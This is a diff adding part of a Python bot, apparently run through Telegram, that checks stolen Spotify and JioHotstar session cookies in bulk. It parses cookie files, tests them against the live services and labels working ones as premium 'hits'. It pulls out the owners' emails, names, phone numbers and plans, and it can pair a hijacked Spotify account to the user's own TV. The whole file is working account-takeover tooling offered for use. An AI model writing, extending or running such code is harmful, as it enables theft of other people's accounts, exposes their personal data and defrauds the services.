@@ -1,0 +1,598 @@
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║              SPOTIFY CHECKER                                            ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+SP_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+)
+SP_UA_MOBILE = (
+    "Mozilla/5.0 (Linux; Android 10; K) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
+)
+
+
+def sp_parse_cookies(content: str) -> dict:
+    cookies = {}
+    try:
+        data = json.loads(content)
+        if isinstance(data, list):
+            for item in data:
+                if isinstance(item, dict) and "name" in item and "value" in item:
+                    cookies[item["name"]] = item["value"]
+            return cookies
+        if isinstance(data, dict):
+            return data
+    except Exception:
+        pass
+    for line in content.split("\n"):
+        line  = line.strip()
+        if not line:
+            continue
+        clean = line[10:] if line.startswith("#HttpOnly_") else line
+        if clean.startswith("#"):
+            continue
+        if "\t" in clean:
+            parts = clean.split("\t")
+            if len(parts) >= 7:
+                cookies[parts[5]] = parts[6].strip()
+        elif "=" in clean:
+            k, _, v = clean.partition("=")
+            k = k.strip()
+            if k and " " not in k:
+                cookies[k] = v.strip()
+    return cookies
+
+
+def sp_get_account_info(cookies: dict) -> Optional[Dict]:
+    try:
+        resp = requests.get(
+            "https://www.spotify.com/eg-ar/account/subscription/manage/",
+            headers={
+                "User-Agent":      SP_UA,
+                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Cache-Control":   "no-cache",
+            },
+            cookies=cookies,
+            allow_redirects=True,
+            timeout=REQUEST_TIMEOUT,
+        )
+        if resp.status_code != 200:
+            return None
+        html    = resp.text
+        page_ok = (
+            "Don't have an account" in html
+            or "إدارة اشتراكك" in html
+            or '"planNameLong"' in html
+            or "subscription" in html.lower()
+        )
+        if not page_ok:
+            return None
+        m    = re.search(r'"planNameLong":"([^"]*?)"', html)
+        plan = m.group(1) if m else ("Spotify Free" if "Spotify Free" in html else "Unknown Plan")
+        m     = re.search(r'"email":"([^"]+)"', html)
+        email = m.group(1) if m else "Unknown"
+        m       = re.search(r'"country":"([^"]+)"', html)
+        country = m.group(1) if m else "Unknown"
+        is_premium = any(k in plan for k in ("Premium", "باقة", "Family", "Duo", "Student"))
+        return {"plan": plan, "email": email, "country": country, "is_premium": is_premium}
+    except Exception:
+        return None
+
+
+def sp_check_one(content: str, filename: str = "") -> Dict:
+    cookies = sp_parse_cookies(content)
+    if not cookies:
+        return {"status": "DEAD", "reason": "No cookies parsed", "filename": filename, "content": content}
+    if "sp_dc" not in cookies:
+        return {"status": "DEAD", "reason": "Missing sp_dc cookie", "filename": filename, "content": content}
+    info = sp_get_account_info(cookies)
+    if not info:
+        return {"status": "DEAD", "reason": "Account check failed / cookie expired", "filename": filename, "content": content}
+    return {
+        "status":   "PREMIUM" if info["is_premium"] else "FREE",
+        "plan":     info["plan"],
+        "email":    info["email"],
+        "country":  info["country"],
+        "filename": filename,
+        "content":  content,
+        "cookies":  cookies,
+    }
+
+
+def sp_check_file(filepath: str) -> Dict:
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+        return sp_check_one(content, os.path.basename(filepath))
+    except Exception as e:
+        return {"status": "DEAD", "reason": f"Read error: {str(e)[:40]}",
+                "filename": os.path.basename(filepath), "content": ""}
+
+
+def sp_get_csrf_and_flow(cookies: dict) -> tuple:
+    try:
+        session  = requests.Session()
+        session.cookies.update(cookies)
+        flow_ctx = f"{uuid.uuid4()}%3A{int(time.time())}"
+        resp = session.get(
+            f"https://accounts.spotify.com/en/link/v2?flow_ctx={flow_ctx}",
+            headers={
+                "User-Agent":      SP_UA_MOBILE,
+                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.9",
+                "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
+                "Referer":         "https://www.spotify.com/",
+            },
+            allow_redirects=True,
+            timeout=REQUEST_TIMEOUT,
+        )
+        if resp.status_code != 200:
+            return None, None, None
+        html = resp.text
+        m    = re.search(r'initialToken":"([^"]+)"', html)
+        csrf = m.group(1) if m else None
+        m = re.search(r"flow_ctx=([^\"'\s&]+)", html)
+        if m:
+            flow_ctx = m.group(1)
+        updated = cookies.copy()
+        for c in session.cookies:
+            updated[c.name] = c.value
+        return csrf, flow_ctx, updated
+    except Exception:
+        return None, None, None
+
+
+def sp_activate_tv(cookies: dict, code: str, csrf: str, flow: str) -> tuple:
+    headers = {
+        "Accept":          "*/*",
+        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
+        "Content-Type":    "application/json",
+        "Origin":          "https://accounts.spotify.com",
+        "Referer":         f"https://accounts.spotify.com/en/link/v2?flow_ctx={flow}",
+        "User-Agent":      SP_UA_MOBILE,
+    }
+    if csrf:
+        headers["x-csrf-token"] = csrf
+    try:
+        r1 = requests.post(
+            f"https://accounts.spotify.com/pair/api/code?flow_ctx={flow}",
+            headers=headers, cookies=cookies,
+            json={"code": code.upper()}, timeout=REQUEST_TIMEOUT,
+        )
+        if r1.status_code != 200:
+            return False, None, f"HTTP {r1.status_code} on code submit"
+        data1 = r1.json()
+        if data1.get("result") == "invalid":
+            return False, None, "Invalid TV code — get a fresh one from your TV"
+        if data1.get("result") != "ok":
+            return False, None, f"Unexpected result: {data1.get('result', 'unknown')}"
+        tv_name = (
+            data1.get("codeInfo", {})
+                 .get("authorizationInfo", {})
+                 .get("clientInfo", {})
+                 .get("name", "Unknown Device")
+        )
+        r2 = requests.post(
+            f"https://accounts.spotify.com/pair/api/resolve?flow_ctx={flow}",
+            headers=headers, cookies=cookies,
+            json={"code": code.upper()}, timeout=REQUEST_TIMEOUT,
+        )
+        if r2.status_code != 200:
+            return False, tv_name, f"HTTP {r2.status_code} on resolve"
+        result = r2.json().get("result", "")
+        if result in ("ok", "success"):
+            return True, tv_name, ""
+        return False, tv_name, f"Resolve returned: {result}"
+    except Exception as e:
+        return False, None, str(e)[:120]
+
+
+# Spotify formatters
+DIV_SP = "═" * 27
+
+def sp_fmt_premium(r: dict) -> str:
+    return (
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
+        f"        {SP_PREMIUM}  <b>SPOTIFY PREMIUM HIT</b>\n"
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
+        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Unknown')}</code>\n"
+        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>"
+    )
+
+
+def sp_fmt_free(r: dict) -> str:
+    return (
+        f"{SP_MUSIC}  <b>SPOTIFY FREE ACCOUNT</b>\n"
+        f"──────────────────────────────\n\n"
+        f"{SP_FREE}   <b>Status  :</b>  <code>Free Plan</code>\n"
+        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>\n"
+        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Spotify Free')}</code>"
+    )
+
+
+def sp_fmt_dead(r: dict) -> str:
+    return (
+        f"{SP_DEAD}  <b>DEAD</b>\n"
+        f"──────────────────────────────\n"
+        f"<i>{r.get('reason','Cookie invalid or expired')}</i>"
+    )
+
+
+def sp_fmt_progress(done: int, total: int, hits: int, free: int, dead: int) -> str:
+    pct    = done / total if total else 0
+    filled = int(pct * 10)
+    bar    = "█" * filled + "░" * (10 - filled)
+    return (
+        f"{SP_BOLT}  <b>Spotify Bulk Check Running…</b>\n\n"
+        f"<code>[{bar}]  {int(pct * 100)}%</code>\n\n"
+        f"{SP_PREMIUM} <b>{hits}</b>   {SP_FREE} <b>{free}</b>   {SP_DEAD} <b>{dead}</b>\n"
+        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
+    )
+
+
+def sp_fmt_summary(hits: int, free: int, dead: int, total: int, elapsed: float) -> str:
+    return (
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
+        f"        {SP_SPARK}  <b>SPOTIFY CHECK COMPLETE</b>\n"
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
+        f"{E_COUNT}   <b>Total   :</b>  <code>{total}</code>\n"
+        f"{SP_PREMIUM}   <b>Premium :</b>  <code>{hits}</code>\n"
+        f"{SP_FREE}   <b>Free    :</b>  <code>{free}</code>\n"
+        f"{SP_DEAD}   <b>Dead    :</b>  <code>{dead}</code>\n\n"
+        f"{E_CLOCK}   <b>Time    :</b>  <code>{elapsed:.1f}s</code>"
+    )
+
+
+def sp_fmt_tv_ready(email, plan, country) -> str:
+    return (
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
+        f"      {SP_TV}  <b>TV ACTIVATION READY</b>\n"
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
+        f"{E_EMAIL}   <b>Account :</b>  <code>{email}</code>\n"
+        f"{E_PLAN}   <b>Plan    :</b>  <code>{plan}</code>\n"
+        f"{E_COUNTRY}   <b>Country :</b>  <code>{country}</code>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{HS_PHONE} On your TV:\n"
+        f"<b>Settings → Log in → Get a code</b>\n\n"
+        f"→ Type the <b>6-character code</b> below 👇"
+    )
+
+
+def sp_fmt_tv_success(tv_name, code, email, plan, country) -> str:
+    return (
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n"
+        f"        {SP_SPARK}  <b>TV ACTIVATED!</b>\n"
+        f"{SP_MUSIC} <b>{DIV_SP}</b>\n\n"
+        f"{SP_TV}   <b>Device  :</b>  <code>{tv_name}</code>\n"
+        f"{SP_CODE}   <b>Code    :</b>  <code>{code}</code>\n"
+        f"{E_EMAIL}   <b>Account :</b>  <code>{email}</code>\n"
+        f"{E_PLAN}   <b>Plan    :</b>  <code>{plan}</code>\n"
+        f"{E_COUNTRY}   <b>Country :</b>  <code>{country}</code>\n\n"
+        f"<i>Open Spotify on your TV — you're in! {E_CHECK}</i>"
+    )
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║              JIOHOTSTAR CHECKER                                         ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+HS_PLAN_KEYWORDS = [
+    ("JioFiber",       "JioFiber Plan"),
+    ("JioHotstar",     "JioHotstar Premium"),
+    ("JHSMobileLite",  "JHS Mobile Lite"),
+    ("HotstarSuper",   "Hotstar Super"),
+    ("HotstarBundle",  "Hotstar Bundle"),
+    ("SingleDevice",   "Single Device"),
+    ("HotstarPremium", "Hotstar Premium"),
+    ("Mobile",         "Mobile Plan"),
+]
+
+
+def hs_decode_jwt(token):
+    try:
+        parts = token.split(".")
+        if len(parts) >= 2:
+            payload = parts[1]
+            payload += "=" * (4 - len(payload) % 4)
+            return json.loads(base64.b64decode(payload))
+    except Exception:
+        pass
+    return None
+
+
+def hs_parse_cookie_content(content):
+    cookies = {}
+    session_token = user_up_token = device_id = None
+    try:
+        data = json.loads(content)
+        if isinstance(data, dict):
+            for key, value in data.items():
+                if key in ["sessionUserUP", "userUP", "deviceId",
+                           "userCountryCode", "userHID", "userPID"]:
+                    cookies[key] = value
+                    if key == "sessionUserUP":
+                        session_token = value
+                    elif key == "userUP":
+                        user_up_token = value
+                    elif key == "deviceId":
+                        device_id = value
+            return cookies, session_token, user_up_token, device_id
+    except Exception:
+        pass
+    for line in content.splitlines():
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split("\t")
+        if len(parts) >= 7:
+            name, value = parts[5], parts[6]
+            cookies[name] = value
+            if name == "sessionUserUP":
+                session_token = value
+            elif name == "userUP":
+                user_up_token = value
+            elif name == "deviceId":
+                device_id = value
+    if not cookies:
+        for line in content.splitlines():
+            line = line.strip()
+            if "=" in line and not line.startswith("#"):
+                key, value = line.split("=", 1)
+                key, value = key.strip(), value.strip()
+                cookies[key] = value
+                if key == "sessionUserUP":
+                    session_token = value
+                elif key == "userUP":
+                    user_up_token = value
+                elif key == "deviceId":
+                    device_id = value
+    return cookies, session_token, user_up_token, device_id
+
+
+def hs_detect_plan(jwt_plan: str) -> str:
+    for keyword, label in HS_PLAN_KEYWORDS:
+        if keyword.lower() in jwt_plan.lower():
+            return label
+    return jwt_plan if jwt_plan not in ("Unknown", "") else "Unknown Plan"
+
+
+def hs_check_single(cookies, session_token, user_up_token, device_id, filename=""):
+    token_to_use = session_token or user_up_token
+    if not cookies and not token_to_use:
+        return {"status": "INVALID", "reason": "No cookies found", "filename": filename}
+
+    name = phone = "Unknown"
+    jwt_plan = "Unknown"
+    jwt_expiry = "Unknown"
+    country_code = "Unknown"
+    subscription_plan = ""
+    subscription_expiry = ""
+    subscription_exp_timestamp = 0
+
+    if token_to_use:
+        jwt_data = hs_decode_jwt(token_to_use)
+        if jwt_data and "sub" in jwt_data:
+            try:
+                sub  = json.loads(jwt_data["sub"])
+                name         = sub.get("name",        "Unknown")
+                phone        = sub.get("phone",       "Unknown")
+                country_code = sub.get("countryCode", "Unknown")
+                subs = sub.get("subscriptions", {})
+                if "in" in subs:
+                    for plan_type, plan_details in subs["in"].items():
+                        subscription_plan   = plan_type
+                        subscription_expiry = plan_details.get("expiry", "")
+                        if subscription_expiry:
+                            try:
+                                exp_str = subscription_expiry.split("T")[0]
+                                exp_dt  = datetime.strptime(exp_str, "%Y-%m-%d")
+                                subscription_exp_timestamp = int(exp_dt.timestamp())
+                            except Exception:
+                                subscription_exp_timestamp = 0
+                        break
+            except Exception:
+                pass
+
+    current_time = int(time.time())
+    has_valid_subscription = (
+        bool(subscription_plan)
+        and subscription_exp_timestamp > 0
+        and subscription_exp_timestamp > current_time
+    )
+    if has_valid_subscription:
+        jwt_plan   = hs_detect_plan(subscription_plan)
+        jwt_expiry = subscription_expiry.split("T")[0] if subscription_expiry else "Unknown"
+
+    headers = {
+        "accept":         "application/json, text/plain, */*",
+        "x-hs-platform":  "web",
+        "x-hs-app":       "260306000",
+        "user-agent":     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "x-country-code": "in",
+        "referer":        "https://www.hotstar.com/in/home",
+    }
+    if cookies:
+        headers["cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
+    if token_to_use:
+        headers["x-hs-usertoken"] = token_to_use
+    if device_id:
+        headers["x-hs-device-id"] = device_id
+
+    try:
+        resp = requests.get(
+            "https://www.hotstar.com/api/internal/bff/v2/slugs/in/settings",
+            headers=headers, timeout=REQUEST_TIMEOUT,
+        )
+        if resp.status_code != 200:
+            return {"status": "INVALID", "reason": f"HTTP {resp.status_code}", "filename": filename}
+        text = resp.text
+        if "ERR_UM_USER_LOGGED_OUT" in text:
+            return {
+                "status":   "DEVICE_LIMIT",
+                "name":     name, "phone": phone,
+                "plan":     jwt_plan, "expiry": jwt_expiry,
+                "cookies":  cookies, "filename": filename,
+            }
+        if has_valid_subscription:
+            days_left = max(0, (subscription_exp_timestamp - current_time) // 86400)
+            show_ads  = "No" if '"showAds":"0"' in text or '"showAds": "0"' in text else "Yes"
+            return {
+                "status":    "LIVE",
+                "name":      name, "phone":    phone,
+                "plan":      jwt_plan, "expiry": jwt_expiry,
+                "days_left": str(days_left), "show_ads": show_ads,
+                "cookies":   cookies, "filename": filename,
+            }
+        return {
+            "status":   "FREE",
+            "name":     name, "phone":  phone,
+            "plan":     jwt_plan, "expiry": jwt_expiry,
+            "cookies":  cookies, "filename": filename,
+        }
+    except Exception as e:
+        return {"status": "INVALID", "reason": str(e)[:60], "filename": filename}
+
+
+def hs_check_file(filepath: str) -> Dict:
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+        cookies, session_token, user_up_token, device_id = hs_parse_cookie_content(content)
+        filename = os.path.basename(filepath)
+        if not cookies and not session_token:
+            sm = re.search(r"sessionUserUP[:=]\s*([^\s;,\n\"']+)", content)
+            um = re.search(r"userUP[:=]\s*([^\s;,\n\"']+)",        content)
+            dm = re.search(r"deviceId[:=]\s*([^\s;,\n\"']+)",      content)
+            if sm: session_token = sm.group(1)
+            if um: user_up_token  = um.group(1)
+            if dm: device_id      = dm.group(1)
+        return hs_check_single(cookies, session_token, user_up_token, device_id, filename)
+    except Exception as e:
+        return {"status": "INVALID", "reason": f"Parse error: {str(e)[:30]}",
+                "filename": os.path.basename(filepath)}
+
+
+def hs_convert_to_netscape(cookies):
+    lines = ["# Netscape HTTP Cookie File"]
+    for name, value in (cookies or {}).items():
+        lines.append(f".hotstar.com\tTRUE\t/\tFALSE\t1779686026\t{name}\t{value}")
+    return "\n".join(lines)
+
+
+def hs_plan_breakdown(results: list) -> dict:
+    bd = defaultdict(list)
+    for r in results:
+        bd[r.get("plan", "Unknown Plan")].append(r)
+    return dict(bd)
+
+
+def _plan_lines(breakdown: dict, prefix: str = "") -> str:
+    if not breakdown:
+        return f"{prefix}<i>None</i>"
+    return "\n".join(
+        f"{prefix}{E_PLAN} <b>{plan}</b>  →  <b>{len(items)}</b>"
+        for plan, items in sorted(breakdown.items(), key=lambda x: -len(x[1]))
+    )
+
+
+# JioHotstar formatters
+def hs_fmt_live(r: dict, hit_num: int = 0) -> str:
+    num_tag = f"  <b>HIT #{hit_num:03d}</b>" if hit_num else ""
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {HS_LIVE} <b>HOTSTAR LIVE!</b>{num_tag}\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
+        f"{HS_PHONE}  <b>Phone  :</b> <code>{r.get('phone','Unknown')}</code>\n"
+        f"{E_PLAN}  <b>Plan   :</b> <code>{r.get('plan','Unknown')}</code>\n"
+        f"{E_DATE}  <b>Expiry :</b> <code>{r.get('expiry','Unknown')}</code>\n"
+        f"{E_CLOCK}  <b>Days   :</b> <code>{r.get('days_left','?')} days left</code>\n"
+        f"{HS_TV}  <b>Ads    :</b> <code>{r.get('show_ads','?')}</code>\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>"
+    )
+
+
+def hs_fmt_device(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {HS_DEVICE} <b>DEVICE LIMIT</b>          ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
+        f"{HS_PHONE}  <b>Phone  :</b> <code>{r.get('phone','Unknown')}</code>\n"
+        f"{E_PLAN}  <b>Plan   :</b> <code>{r.get('plan','Unknown')}</code>\n"
+        f"{E_DATE}  <b>Expiry :</b> <code>{r.get('expiry','Unknown')}</code>\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>"
+    )
+
+
+def hs_fmt_free(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {HS_FREE} <b>HOTSTAR FREE</b>           ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{HS_USER}  <b>Name   :</b> <code>{r.get('name','Unknown')}</code>\n"
+        f"{HS_PHONE}  <b>Phone  :</b> <code>{r.get('phone','Unknown')}</code>\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n\n"
+        f"<i>No active subscription found.</i>"
+    )
+
+
+def hs_fmt_invalid(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {HS_INVALID} <b>INVALID COOKIE</b>        ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
+        f"{HS_INVALID}  <b>Reason :</b> <code>{r.get('reason','Unknown error')}</code>"
+    )
+
+
+def hs_fmt_single(r: dict) -> str:
+    s = r.get("status", "INVALID")
+    if s == "LIVE":         return hs_fmt_live(r, 1)
+    if s == "DEVICE_LIMIT": return hs_fmt_device(r)
+    if s == "FREE":         return hs_fmt_free(r)
+    return hs_fmt_invalid(r)
+
+
+def hs_fmt_progress(processed, total, live, device, free, invalid, breakdown):
+    pct      = int(processed / total * 100) if total else 0
+    bar      = _pbar(processed, total)
+    plan_sec = (
+        f"\n\n{E_STATS} <b>Live — By Plan:</b>\n" + _plan_lines(breakdown, "  ")
+        if breakdown else ""
+    )
+    return (
+        f"{E_GEAR} <b>Hotstar Checker</b> — Running\n\n"
+        f"<code>[{bar}] {pct}%</code>\n"
+        f"<b>{processed}</b> / <b>{total}</b> checked\n\n"
+        f"{HS_LIVE} Live          : <b>{live}</b>\n"
+        f"{HS_DEVICE} Device Limit  : <b>{device}</b>\n"
+        f"{HS_FREE} Free          : <b>{free}</b>\n"
+        f"{HS_INVALID} Invalid       : <b>{invalid}</b>"
+        f"{plan_sec}"
+    )
+
+
+def hs_fmt_summary(total, live, device, free, invalid, breakdown):
+    pct       = f"{live / total * 100:.1f}" if total else "0.0"
+    plan_text = _plan_lines(breakdown, "  ") if breakdown else "  <i>No live hits</i>"
+    return (
+        f"{E_CHECK} <b>Hotstar Check Complete!</b>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E_COUNT} Total Checked  : <b>{total}</b>\n"
+        f"{HS_LIVE} Live           : <b>{live}</b>  (<i>{pct}% hit rate</i>)\n"
+        f"{HS_DEVICE} Device Limit   : <b>{device}</b>\n"
+        f"{HS_FREE} Free           : <b>{free}</b>\n"
+        f"{HS_INVALID} Invalid        : <b>{invalid}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{E_STATS} <b>Live — By Plan:</b>\n{plan_text}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
+    )
+
+
+# ══════════════════════════ END OF CHUNK 2 ══════════════════════════
